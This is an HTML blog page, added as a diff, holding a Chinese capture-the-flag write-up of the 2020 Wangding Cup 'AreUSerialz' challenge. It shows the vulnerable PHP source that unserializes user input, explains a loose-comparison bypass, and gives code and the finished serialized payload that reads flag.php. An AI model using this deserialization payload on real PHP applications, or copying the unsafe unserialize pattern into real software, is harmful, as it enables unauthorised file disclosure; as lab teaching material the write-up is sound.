@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="前言 这道题涉及一些PHP反序列化魔法函数的触发，以及绕过思想  Web-AreUSerialz 题目地址 开搞 打开题目，就是一段php代码           代码：  &lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &amp;#123;    protected $op;    pr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020-网鼎杯-青龙组-Web-AreUSerialz 反序列化_WriteUp">
+<meta property="og:url" content="http://example.com/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/index.html">
+<meta property="og:site_name">
+<meta property="og:description" content="前言 这道题涉及一些PHP反序列化魔法函数的触发，以及绕过思想  Web-AreUSerialz 题目地址 开搞 打开题目，就是一段php代码           代码：  &lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &amp;#123;    protected $op;    pr">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/b1.png">
+<meta property="og:image" content="http://example.com/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/b4.png">
+<meta property="og:image" content="http://example.com/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/b2.png">
+<meta property="og:image" content="http://example.com/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/b3.png">
+<meta property="article:published_time" content="2021-08-23T14:25:45.000Z">
+<meta property="article:modified_time" content="2021-08-23T15:59:59.177Z">
+<meta property="article:author" content="Powered by Hopper">
+<meta property="article:tag" content="CTF反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/b1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>2020-网鼎杯-青龙组-Web-AreUSerialz 反序列化_WriteUp</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <!-- <ul>
+        <li><a href="/">主页</a></li>
+      </ul> -->
+      <!-- <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul> -->
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2021/08/24/XXE-and-XML%E7%9A%84%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E5%92%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2021/08/22/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <!-- <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li> -->
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <!-- <span id="i-share" class="info" style="display:none;">Share post</span> -->
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <!-- <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/&text=2020-网鼎杯-青龙组-Web-AreUSerialz 反序列化_WriteUp"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/&title=2020-网鼎杯-青龙组-Web-AreUSerialz 反序列化_WriteUp"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/&is_video=false&description=2020-网鼎杯-青龙组-Web-AreUSerialz 反序列化_WriteUp"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2020-网鼎杯-青龙组-Web-AreUSerialz 反序列化_WriteUp&body=Check out this article: http://example.com/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/&title=2020-网鼎杯-青龙组-Web-AreUSerialz 反序列化_WriteUp"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/&title=2020-网鼎杯-青龙组-Web-AreUSerialz 反序列化_WriteUp"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/&title=2020-网鼎杯-青龙组-Web-AreUSerialz 反序列化_WriteUp"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/&title=2020-网鼎杯-青龙组-Web-AreUSerialz 反序列化_WriteUp"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/&name=2020-网鼎杯-青龙组-Web-AreUSerialz 反序列化_WriteUp&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul> -->
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E6%90%9E"><span class="toc-number">2.</span> <span class="toc-text">开搞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E4%BB%A3%E7%A0%81%E8%A7%A6%E5%8F%91"><span class="toc-number">3.</span> <span class="toc-text">构造代码触发</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        2020-网鼎杯-青龙组-Web-AreUSerialz 反序列化_WriteUp
+    </h1>
+
+
+
+    
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name"></span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2021-08-23T14:25:45.000Z" itemprop="datePublished">2021-08-23</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">CTF反序列化</a>
+    </div>
+
+          
+    </div>
+
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <br>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>这道题涉及一些PHP反序列化魔法函数的触发，以及绕过思想</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.ctfhub.com/#/challenge">Web-AreUSerialz 题目地址</a></p>
+<h2 id="开搞"><a href="#开搞" class="headerlink" title="开搞"></a>开搞</h2><blockquote>
+<p>打开题目，就是一段php代码</p>
+</blockquote>
+<br>
+
+<img src="/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/b1.png" class="">
+
+<br>
+
+<br>
+
+<blockquote>
+<p>代码：</p>
+</blockquote>
+<div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<br>
+
+<blockquote>
+<p>思路：</p>
+</blockquote>
+<ol>
+<li>获取flag存储flag.php</li>
+<li>可以看到有两个魔法函数 __destruct    __construct</li>
+<li>传输str参数数据后触发destruct ，存储 is_valid 过滤</li>
+<li>__destruct 中会调用process，其中op&#x3D;1写入以及op&#x3D;2 读取，这里想要拿到flag，采用op&#x3D;2  即读取来拿到flag</li>
+<li>涉及对象 FileHandler ，变量op 及filename，content，进行构造输出</li>
+</ol>
+<h2 id="构造代码触发"><a href="#构造代码触发" class="headerlink" title="构造代码触发"></a>构造代码触发</h2><blockquote>
+<p>构造代码输出</p>
+</blockquote>
+<div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>= <span class="string">&#x27; 2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&quot;haha&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="variable">$flag_1</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>这里构造 $op&#x3D; ‘ 2’; 来绕过代码中的过滤，防止被强制转换成 op&#x3D;1</p>
+<blockquote>
+<p>注意 &#x3D; &#x3D; 仅验证数值     &#x3D; &#x3D; &#x3D; 验证值和类型   这也是为什么能绕过的原因所在</p>
+</blockquote>
+<p>转换后：</p>
+<div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot; 2&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;haha&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<br>
+
+<blockquote>
+<p>在地址后面传输以及转换的str值</p>
+</blockquote>
+<br>
+
+<img src="/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/b4.png" class="">
+
+<br>
+
+<blockquote>
+<p>触发成功，出现 [Result]:</p>
+</blockquote>
+<img src="/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/b2.png" class="">
+
+<br>
+
+<blockquote>
+<p>检查源代码即可</p>
+</blockquote>
+<img src="/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/b3.png" class="">
+
+<br>
+
+  </div>
+</article>
+
+
+
+
+
+
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E6%90%9E"><span class="toc-number">2.</span> <span class="toc-text">开搞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E4%BB%A3%E7%A0%81%E8%A7%A6%E5%8F%91"><span class="toc-number">3.</span> <span class="toc-text">构造代码触发</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <!-- <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/&text=2020-网鼎杯-青龙组-Web-AreUSerialz 反序列化_WriteUp"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/&title=2020-网鼎杯-青龙组-Web-AreUSerialz 反序列化_WriteUp"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/&is_video=false&description=2020-网鼎杯-青龙组-Web-AreUSerialz 反序列化_WriteUp"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2020-网鼎杯-青龙组-Web-AreUSerialz 反序列化_WriteUp&body=Check out this article: http://example.com/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/&title=2020-网鼎杯-青龙组-Web-AreUSerialz 反序列化_WriteUp"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/&title=2020-网鼎杯-青龙组-Web-AreUSerialz 反序列化_WriteUp"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/&title=2020-网鼎杯-青龙组-Web-AreUSerialz 反序列化_WriteUp"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/&title=2020-网鼎杯-青龙组-Web-AreUSerialz 反序列化_WriteUp"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/08/23/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/&name=2020-网鼎杯-青龙组-Web-AreUSerialz 反序列化_WriteUp&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul> -->
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
